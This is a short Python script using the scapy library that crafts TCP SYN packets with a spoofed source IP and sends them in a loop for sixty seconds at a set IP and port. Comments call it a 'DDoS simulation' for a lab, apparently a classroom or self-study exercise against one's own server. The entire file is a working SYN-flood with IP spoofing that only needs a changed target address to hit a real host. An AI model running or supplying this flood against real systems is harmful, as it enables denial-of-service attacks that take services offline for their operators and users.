from scapy.all import IP, TCP, send
import time

# Set target and spoofed source IPs (adjust these for your lab environment)
target_ip = "10.232.171.229"  # Replace with your HTTP server's IP (your Wi-Fi IP)
target_port = 8000           # The port on which your HTTP server is running
spoofed_ip = "10.0.0.143"      # An arbitrary spoofed IP (lab only)

# Create a TCP SYN packet with a spoofed source IP
packet = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=12345, dport=target_port, flags="S")

print("Starting DDoS simulation with spoofed IP...")
start_time = time.time()
packet_count = 0
duration = 60  # duration in seconds for the attack simulation

while time.time() - start_time < duration:
    send(packet, verbose=0)
    packet_count += 1

print(f"Sent {packet_count} spoofed packets over {duration} seconds.")